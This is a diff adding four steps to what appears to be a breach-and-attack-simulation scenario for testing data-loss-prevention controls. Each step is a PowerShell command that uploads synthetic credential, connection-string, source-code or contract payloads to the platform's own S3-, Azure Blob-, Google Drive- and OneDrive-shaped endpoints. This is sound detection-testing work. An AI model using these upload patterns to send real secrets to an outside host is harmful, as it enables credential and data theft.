@@ -343,3 +343,168 @@ steps:
       # See the S3 step above for why this step's graded verdict never
       # comes from this script's own success/failure.
     cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — AWS Cloud Credentials over S3-compatible shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — S3-Compatible Exfiltration of AWS Cloud Credentials (T1567.002)"
+    technique_id: T1567.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "PUTs a synthetic AWS-credential-shaped payload to the platform's own S3-compatible-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated S3 request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: S3-shaped HTTPS PUT (path structure, x-amz-* headers) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+      $token = "{{SINK_TOKEN}}"
+      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/s3/bas-sim-bucket/$token.dat"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Put -Body $payload `
+          -Headers @{ 'x-amz-content-sha256' = 'UNSIGNED-PAYLOAD'; 'x-amz-date' = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ') } `
+          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: s3_put_result=success"
+        Write-Output "EXEC T1567.002: AWS-credential-shaped S3-compatible traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: s3_put_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.002: S3-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-S3]"
+      }
+      # See the S3 step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — MongoDB Connection String over Azure Blob shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Azure Blob-Compatible Exfiltration of MongoDB Connection String (T1567.002)"
+    technique_id: T1567.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "PUTs a synthetic MongoDB-connection-string-shaped payload to the platform's own Azure-Blob-compatible-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated Azure request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Azure-Blob-shaped HTTPS PUT (path structure, x-ms-* headers) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "mongodb://bas_sim_user:BAS-SIM-DLP-Placeholder3@bas-sim-mongo:27017/bas_sim_dlp"
+      $token = "{{SINK_TOKEN}}"
+      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/azureblob/bas-sim-container/$token.dat"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Put -Body $payload `
+          -Headers @{ 'x-ms-version' = '2021-08-06'; 'x-ms-blob-type' = 'BlockBlob' } `
+          -ContentType 'application/octet-stream' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: azureblob_put_result=success"
+        Write-Output "EXEC T1567.002: MongoDB-connection-string-shaped Azure Blob traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-AZUREBLOB]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: azureblob_put_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.002: Azure Blob-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-AZUREBLOB]"
+      }
+      # See the S3 step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — C# Source Code over Google Drive shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Google Drive-Compatible Exfiltration of C# Source Code (T1567.002)"
+    technique_id: T1567.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic C#-source-code-shaped payload (embedded fake secret) to the platform's own Drive-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated Drive API request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Google-Drive-shaped multipart HTTPS POST content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "// [BAS-SIM-DLP]`nstring apiKey = `"BAS-SIM-DLP-Placeholder7`"; // test fixture"
+      $token = "{{SINK_TOKEN}}"
+      $boundary = [System.Guid]::NewGuid().ToString()
+      $metadata = "{`"name`":`"$token.dat`",`"mimeType`":`"text/plain`"}"
+      $bodyLines = @(
+        "--$boundary",
+        'Content-Type: application/json; charset=UTF-8',
+        '',
+        $metadata,
+        "--$boundary",
+        'Content-Type: text/plain',
+        '',
+        $payload,
+        "--$boundary--"
+      ) -join "`r`n"
+      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/gdrive/upload/drive/v3/files"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $bodyLines -ContentType "multipart/related; boundary=$boundary" -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: gdrive_upload_result=success"
+        Write-Output "EXEC T1567.002: C#-source-code-shaped Google Drive traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: gdrive_upload_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.002: Google Drive-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-GDRIVE]"
+      }
+      # See the S3 step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — Partnership Agreement over OneDrive shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — OneDrive (Graph API)-Compatible Exfiltration of Partnership Agreement (T1567.002)"
+    technique_id: T1567.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "PUTs a synthetic partnership-agreement-shaped payload to the platform's own Graph-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated Graph request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Microsoft-Graph-shaped HTTPS PUT (upload-by-path structure) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DLP] Partnership Agreement (Synthetic)`nParty A: BAS-SIM-Corp-A`nParty B: BAS-SIM-Corp-B (test fixture only)"
+      $token = "{{SINK_TOKEN}}"
+      $uri = "https://{{SINK_CLOUD_HOST}}:{{SINK_CLOUD_PORT}}/cloudsink/graph/v1.0/me/drive/root:/$token.dat:/content"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Put -Body $payload -ContentType 'text/plain' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: onedrive_put_result=success"
+        Write-Output "EXEC T1567.002: Partnership-agreement-shaped OneDrive traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: onedrive_put_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.002: OneDrive-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CLOUD-ONEDRIVE]"
+      }
+      # See the S3 step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
